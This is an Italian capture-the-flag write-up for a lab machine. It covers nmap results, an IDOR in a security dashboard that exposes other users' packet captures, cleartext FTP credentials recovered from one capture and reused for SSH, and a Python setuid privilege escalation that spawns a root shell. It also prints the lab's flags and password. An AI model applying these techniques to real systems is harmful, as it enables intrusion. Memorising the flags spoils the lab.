# Intro
ip macchina: 10.10.10.245

<br>

# Scan con nmap

> Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-19 11:44 CET  
> Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
> SYN Stealth Scan Timing: About 12.20% done; ETC: 11:44 (0:00:14 remaining)  
> Nmap scan report for 10.10.10.245  
> Host is up (0.44s latency).  
> Not shown: 997 closed tcp ports (reset)  
> PORT   STATE SERVICE VERSION    
> 21/tcp open  ftp     vsftpd 3.0.3   
> 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)  
> | ssh-hostkey:    
> |   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)    
> |   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)  
> |_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)  
> 80/tcp open  http    Gunicorn  
> |_http-server-header: gunicorn    
> |_http-title: Security Dashboard  
> Device type: general purpose  
> Running: Linux 4.X|5.X  
> OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5  
> OS details: Linux 4.15 - 5.19  
> Network Distance: 2 hops  

- noto aperta una porta 80 -> provo ad accedere tramite burp e chrome
- noto inoltre FTP aperto -> provo ad accedere come anonimo

<br>

# FTP exploit
Provo a connettermi in ftp con account anonymous ma non funziona in quanto hanno impostato una password


# Overview Sito Web
Sembra una semplice dashboard di sicurezza ad occhio, nella quale:
- vengono mostrati valori come il numero di tentativi di login, gli scan delle porte ecc con dei grafici # sembra inutile
- Si possono fare scan di sicurezza (intercettazioni) per poi scaricare i pcap.
- SOno presenti schede del sito che eseguono comandi sul terminale e ne stampano l'output da quel che sembra

- Azioni da provare ad eseguire:
    1. analizzare il pcap con wireshark -> non sembra nulla di interessasnte
    2. intercettare con burp e vedere se si può ottenere RCE -> non sembra la strada

- Analisi URL:
    - avviando la scan si nota che la pagina ti redirecta verso la scheda /data/IdScan
        - provando a inserire altri id ottengo scan di altri utenti. Scarico e analizzo la scan 0 con wireshark


# Analisi Wireshark del pacchetto 0.pcap

Noto nel file che ci sono dei pacchetti FTP -> potrebbero contenere password in chiaro: BINGO
user : nathan
pass: Buck3tH4TF0RM3!

mi connetto in ftp e scarico tutti i file nella home di nathan, tra cui la **user flag**

tra gli altri file trovo results.txt, che contiene il risultato di una scan linpeas

# SSH
la pass di nathan funziona anche in ssh ->  mi connetto alla macchina in ssh

eseguo linpeas.sh per verificare se ci sono modi per fare priviledge escalation (o alternativamente stampo results.txt)

noto che python 3.8 è vulnerabile a privesc

# priviledge escalation

apro python3 ed eseguo i seguenti comandi

> import os
> import pty
> 
> os.setuid(0)
> os.system("whoami")
> 
> // verifico quindi che sono root
> 
> pty.spawn("/bin/sh")

ottengo quindi una shell da root e stampo la flag in /root/root.txt


# user flag

9ebbf5d7436dd6f9d5242f6a4cc39461


# root flag 
19891665fc871f8d3e07b9f13d2e4819